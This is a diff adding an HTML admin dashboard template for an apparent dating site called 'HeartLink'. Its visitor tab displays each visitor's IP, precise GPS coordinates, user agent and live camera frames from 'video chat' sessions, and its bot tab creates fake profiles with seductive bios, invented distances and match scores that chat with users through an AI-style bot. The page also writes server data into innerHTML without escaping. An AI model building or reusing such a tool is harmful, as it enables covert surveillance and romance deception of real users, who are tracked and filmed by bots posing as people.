@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Admin Dashboard – HeartLink</title>
+  <link rel="stylesheet" href="/static/style.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .media-badge { display: inline-block; padding: 0.2rem 0.55rem; border-radius: 999px; font-size: 0.75rem; font-weight: 600; }
+    .media-badge.live { background: rgba(16,185,129,0.2); color: #34d399; border: 1px solid #10b981; }
+    .media-badge.off { background: rgba(168,162,158,0.15); color: #a8a29e; }
+    .media-badge.granted { background: rgba(251,113,133,0.15); color: #fb7185; border: 1px solid #e11d48; }
+    .frame-preview { max-width: 140px; border-radius: 8px; border: 1px solid var(--border); cursor: pointer; }
+    .frame-preview:hover { outline: 2px solid var(--accent); }
+    .detail-panel {
+      position: fixed; top: 0; right: 0; bottom: 0; width: min(420px, 100%);
+      background: var(--card); border-left: 1px solid var(--border); z-index: 400;
+      padding: 1.5rem; overflow-y: auto; transform: translateX(100%); transition: transform 0.3s ease;
+      box-shadow: -10px 0 40px rgba(0,0,0,0.5);
+    }
+    .detail-panel.open { transform: translateX(0); }
+    .detail-panel h2 { font-size: 1.3rem; margin-bottom: 1rem; }
+    .detail-panel .live-video { width: 100%; border-radius: 12px; background: #000; min-height: 200px; object-fit: cover; }
+    .detail-meta { margin: 1rem 0; font-size: 0.9rem; color: var(--muted); }
+    .detail-meta strong { color: var(--text); }
+    .close-detail { position: absolute; top: 1rem; right: 1rem; background: none; border: none; color: var(--muted); font-size: 1.6rem; cursor: pointer; }
+    .refresh-hint { font-size: 0.8rem; color: var(--muted); margin-top: 0.5rem; }
+    .admin-tabs { display: flex; gap: 0.5rem; margin-bottom: 1.5rem; }
+    .admin-tabs a {
+      padding: 0.5rem 1.2rem; border-radius: 999px; text-decoration: none; font-size: 0.9rem;
+      color: var(--muted); border: 1px solid var(--border);
+    }
+    .admin-tabs a.active, .admin-tabs a:hover { background: var(--accent); color: white; border-color: var(--accent); }
+    .bot-form {
+      background: var(--card); border: 1px solid var(--border); border-radius: 1rem;
+      padding: 1.5rem; margin-bottom: 2rem; max-width: 520px;
+    }
+    .bot-form label { display: block; font-size: 0.85rem; color: var(--muted); margin: 0.8rem 0 0.3rem; }
+    .bot-form input, .bot-form textarea {
+      width: 100%; padding: 0.65rem 0.9rem; background: #0c0a0f;
+      border: 1px solid var(--border); border-radius: 0.5rem; color: var(--text); font-size: 0.95rem;
+    }
+    .bot-form textarea { min-height: 70px; resize: vertical; }
+    .bot-form .row { display: flex; gap: 1rem; }
+    .bot-form .row > div { flex: 1; }
+    .bot-form .check { display: flex; align-items: center; gap: 0.5rem; margin-top: 1rem; }
+    .bot-form .check input { width: auto; }
+    .bots-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 1rem; }
+    .bot-card {
+      background: var(--card); border: 1px solid var(--border); border-radius: 1rem;
+      padding: 1.2rem; position: relative;
+    }
+    .bot-card h4 { margin-bottom: 0.3rem; }
+    .bot-card .bio { color: var(--muted); font-size: 0.85rem; font-style: italic; margin: 0.5rem 0; }
+    .bot-card .meta { font-size: 0.8rem; color: var(--accent-soft); }
+    .bot-card form { margin-top: 0.8rem; }
+  </style>
+</head>
+<body class="admin-body">
+  <header class="admin-header">
+    <div class="logo">♥ HeartLink Admin</div>
+    <div class="admin-actions">
+      <form method="POST" action="/admin/clear" style="display:inline" onsubmit="return confirm('Clear all logged visitors?')">
+        <button type="submit" class="secondary-btn small">Clear logs</button>
+      </form>
+      <a href="/admin/logout" class="secondary-btn small">Logout</a>
+    </div>
+  </header>
+
+  <main class="admin-main">
+    <div class="admin-tabs">
+      <a href="#visitors" class="active" id="tabVisitors">Visitors</a>
+      <a href="#bots" id="tabBots">Manage Bots</a>
+    </div>
+
+    <!-- VISITORS -->
+    <section id="visitorsSection">
+      <h1>Visitor Location, IP & Media Logs</h1>
+      <p class="admin-desc">
+        Users who granted location (and optionally camera/mic). Live frames appear while session is active (~30 min).
+      </p>
+
+      {% if visitors %}
+      <div class="table-wrap">
+        <table class="admin-table">
+          <thead>
+            <tr>
+              <th>ID</th>
+              <th>IP Address</th>
+              <th>Location</th>
+              <th>Media</th>
+              <th>Last Camera</th>
+              <th>Timestamp</th>
+              <th>Actions</th>
+            </tr>
+          </thead>
+          <tbody>
+            {% for v in visitors %}
+            <tr>
+              <td><code>{{ v.id }}</code></td>
+              <td><strong>{{ v.ip }}</strong></td>
+              <td>
+                {% if v.latitude %}
+                  {{ "%.4f"|format(v.latitude|float) }}, {{ "%.4f"|format(v.longitude|float) }}
+                  <br><a href="{{ v.maps_link }}" target="_blank" rel="noopener">Map</a>
+                {% else %}—{% endif %}
+              </td>
+              <td>
+                {% if v.live %}
+                  <span class="media-badge live">● LIVE</span>
+                {% elif v.media_granted %}
+                  <span class="media-badge granted">Camera+Mic</span>
+                {% else %}
+                  <span class="media-badge off">None</span>
+                {% endif %}
+              </td>
+              <td>
+                {% if v.last_frame %}
+                  <img src="{{ v.last_frame }}" class="frame-preview" alt="camera" onclick="openDetail('{{ v.id }}')" />
+                {% else %}—{% endif %}
+              </td>
+              <td>{{ v.timestamp }}{% if v.media_updated %}<br><small>Media: {{ v.media_updated }}</small>{% endif %}</td>
+              <td><button class="secondary-btn small" onclick="openDetail('{{ v.id }}')">View</button></td>
+            </tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </div>
+      <p class="count">Total records: <strong>{{ visitors|length }}</strong></p>
+      {% else %}
+      <div class="empty-state">
+        <p>No location / media data yet.</p>
+        <p>Open the main site, allow location, then start a video chat.</p>
+      </div>
+      {% endif %}
+    </section>
+
+    <!-- BOTS MANAGEMENT -->
+    <section id="botsSection" style="display:none">
+      <h1 id="bots">Manage Chat Bots</h1>
+      <p class="admin-desc">Add new dummy profiles. They appear on the main site and reply to users with the AI-style chatbot.</p>
+
+      <form class="bot-form" method="POST" action="/admin/bots/add">
+        <h3 style="margin-bottom:0.5rem">Add new bot</h3>
+        <div class="row">
+          <div>
+            <label>Name *</label>
+            <input type="text" name="name" required placeholder="e.g. Sara" />
+          </div>
+          <div>
+            <label>Age</label>
+            <input type="number" name="age" value="24" min="18" max="99" />
+          </div>
+        </div>
+        <label>Bio / tagline</label>
+        <textarea name="bio" placeholder="A short seductive line…"></textarea>
+        <div class="row">
+          <div>
+            <label>Distance</label>
+            <input type="text" name="dist" value="1.5 km" placeholder="1.2 km" />
+          </div>
+          <div>
+            <label>Match %</label>
+            <input type="text" name="match" value="92%" placeholder="90%" />
+          </div>
+        </div>
+        <div class="check">
+          <input type="checkbox" name="featured" id="featured" />
+          <label for="featured" style="margin:0">Show in “Tonight’s most wanted”</label>
+        </div>
+        <button type="submit" class="cta-btn" style="margin-top:1.2rem">Add Bot</button>
+      </form>
+
+      <h3 style="margin-bottom:1rem">Current bots ({{ bots|length }})</h3>
+      <div class="bots-list">
+        {% for b in bots %}
+        <div class="bot-card">
+          <h4>{{ b.name }}, {{ b.age }}</h4>
+          <p class="bio">“{{ b.bio }}”</p>
+          <p class="meta">{{ b.dist }} • {{ b.match }}{% if b.featured %} • Featured{% endif %}</p>
+          <form method="POST" action="/admin/bots/delete/{{ b.id }}" onsubmit="return confirm('Delete {{ b.name }}?')">
+            <button type="submit" class="secondary-btn small">Delete</button>
+          </form>
+        </div>
+        {% else %}
+        <p style="color:var(--muted)">No bots yet. Add one above.</p>
+        {% endfor %}
+      </div>
+    </section>
+  </main>
+
+  <div id="detailPanel" class="detail-panel">
+    <button class="close-detail" onclick="closeDetail()">×</button>
+    <h2 id="detailTitle">Visitor</h2>
+    <div id="detailContent">Loading…</div>
+  </div>
+
+  <script>
+    const tabV = document.getElementById("tabVisitors");
+    const tabB = document.getElementById("tabBots");
+    const secV = document.getElementById("visitorsSection");
+    const secB = document.getElementById("botsSection");
+
+    function showVisitors() {
+      secV.style.display = ""; secB.style.display = "none";
+      tabV.classList.add("active"); tabB.classList.remove("active");
+    }
+    function showBots() {
+      secV.style.display = "none"; secB.style.display = "";
+      tabB.classList.add("active"); tabV.classList.remove("active");
+    }
+    tabV.onclick = (e) => { e.preventDefault(); showVisitors(); };
+    tabB.onclick = (e) => { e.preventDefault(); showBots(); };
+    if (location.hash === "#bots") showBots();
+
+    function openDetail(vid) {
+      document.getElementById("detailPanel").classList.add("open");
+      document.getElementById("detailContent").innerHTML = "Loading…";
+      fetch("/api/admin/visitor/" + vid)
+        .then(r => r.json())
+        .then(v => {
+          document.getElementById("detailTitle").textContent = "Visitor " + v.id;
+          let html = `<div class="detail-meta">
+            <p><strong>IP:</strong> ${v.ip}</p>
+            <p><strong>Location:</strong> ${v.latitude ? v.latitude + ", " + v.longitude : "—"}
+              ${v.maps_link ? ` <a href="${v.maps_link}" target="_blank">Open map</a>` : ""}</p>
+            <p><strong>Accuracy:</strong> ${v.accuracy || "—"} m</p>
+            <p><strong>Media:</strong> ${v.live ? '<span class="media-badge live">● LIVE</span>' : (v.media_granted ? "Granted (session ended)" : "Not granted")}</p>
+            <p><strong>Last update:</strong> ${v.media_updated || v.timestamp}</p>
+            <p><strong>User-Agent:</strong> <small>${v.user_agent || "—"}</small></p>
+          </div>`;
+          if (v.last_frame) {
+            html += `<p style="margin-bottom:0.5rem;font-size:0.9rem;color:var(--muted)">Last camera frame:</p>
+              <img src="${v.last_frame}" class="live-video" alt="User camera" />
+              <p class="refresh-hint">Click View again to refresh the frame.</p>`;
+          } else {
+            html += `<p style="color:var(--muted)">No camera frame yet.</p>`;
+          }
+          document.getElementById("detailContent").innerHTML = html;
+        })
+        .catch(() => { document.getElementById("detailContent").innerHTML = "Failed to load."; });
+    }
+    function closeDetail() {
+      document.getElementById("detailPanel").classList.remove("open");
+    }
+  </script>
+</body>
+</html>
